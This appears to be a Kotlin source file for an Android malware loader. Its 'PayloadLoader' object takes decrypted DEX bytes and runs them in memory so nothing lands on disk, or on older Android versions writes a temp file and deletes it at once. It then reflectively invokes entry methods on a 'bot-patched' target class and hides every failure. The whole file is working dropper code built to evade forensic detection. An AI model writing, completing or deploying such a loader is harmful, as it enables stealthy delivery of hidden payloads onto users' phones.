package com.cristal.bristral.tristral.mistral.loader

import android.content.Context
import android.os.Build
import dalvik.system.DexClassLoader
import dalvik.system.InMemoryDexClassLoader
import java.io.File
import java.nio.ByteBuffer

/**
 * PayloadLoader — loads decrypted DEX bytes and executes payload entry point.
 *
 * Android 8+ (API 26): InMemoryDexClassLoader — zero disk touch
 * Android 5-7 (API 21-25): DexClassLoader — writes temp file, deletes immediately
 *
 * Entry point: TARGET_CLASS.onCreate(context) or TARGET_CLASS.start(context)
 * Falls back gracefully if class/method not found.
 */
object PayloadLoader {

    // ── Patched by bot ─────────────────────────────────────────
    private const val TARGET_PACKAGE = "com.android.pictach"
    private const val TARGET_CLASS   = "com.android.pictach.MainActivity"
    // ───────────────────────────────────────────────────────────

    private val ENTRY_METHODS = arrayOf("start", "init", "run", "execute", "onCreate")

    sealed class LoadResult {
        object Success : LoadResult()
        data class Failure(val reason: String) : LoadResult()
    }

    /**
     * Load decrypted DEX bytes and invoke entry point.
     * @param context       Android context
     * @param dexBytes      raw decrypted DEX bytes
     * @return LoadResult.Success or LoadResult.Failure
     */
    fun load(context: Context, dexBytes: ByteArray): LoadResult {
        return try {
            val classLoader = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                loadInMemory(dexBytes, context)
            } else {
                loadViaTempFile(context, dexBytes)
            }

            classLoader ?: return LoadResult.Failure("ClassLoader creation failed")

            // Try to find and invoke entry point
            invokeEntryPoint(context, classLoader)

            LoadResult.Success

        } catch (e: Exception) {
            LoadResult.Failure(e.message ?: "Unknown error")
        }
    }

    /**
     * Android 8+ — InMemoryDexClassLoader (zero disk touch).
     */
    private fun loadInMemory(dexBytes: ByteArray, context: Context): ClassLoader? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val buffer = ByteBuffer.wrap(dexBytes)
                InMemoryDexClassLoader(buffer, context.classLoader)
            } else null
        } catch (e: Exception) {
            null
        }
    }

    /**
     * Android 5-7 — DexClassLoader with temp file.
     * File is deleted immediately after ClassLoader is created.
     */
    private fun loadViaTempFile(context: Context, dexBytes: ByteArray): ClassLoader? {
        var tempFile: File? = null
        return try {
            // Write to private app cache (not external storage)
            tempFile = File(context.cacheDir, "${System.currentTimeMillis()}.tmp")
            tempFile.writeBytes(dexBytes)

            val optimizedDir = context.cacheDir.absolutePath
            val loader = DexClassLoader(
                tempFile.absolutePath,
                optimizedDir,
                null,
                context.classLoader
            )

            // Delete temp file immediately — ClassLoader keeps bytes in RAM
            tempFile.delete()
            tempFile = null

            loader
        } catch (e: Exception) {
            tempFile?.delete()
            null
        }
    }

    /**
     * Try known entry point method names on TARGET_CLASS.
     * Silent — tries each method, continues if not found.
     */
    private fun invokeEntryPoint(context: Context, classLoader: ClassLoader) {
        try {
            val clazz = classLoader.loadClass(TARGET_CLASS)

            // Try static entry methods first
            for (methodName in ENTRY_METHODS) {
                try {
                    val method = clazz.getDeclaredMethod(methodName, Context::class.java)
                    method.isAccessible = true
                    method.invoke(null, context)
                    return
                } catch (e: NoSuchMethodException) {
                    // Try next
                }
            }

            // Try instantiating and calling instance method
            try {
                val instance = clazz.getDeclaredConstructor().newInstance()
                for (methodName in ENTRY_METHODS) {
                    try {
                        val method = clazz.getDeclaredMethod(methodName, Context::class.java)
                        method.isAccessible = true
                        method.invoke(instance, context)
                        return
                    } catch (e: NoSuchMethodException) { }
                }
            } catch (e: Exception) { }

        } catch (e: Exception) {
            // Class not found or invocation failed — silent
        }
    }
}
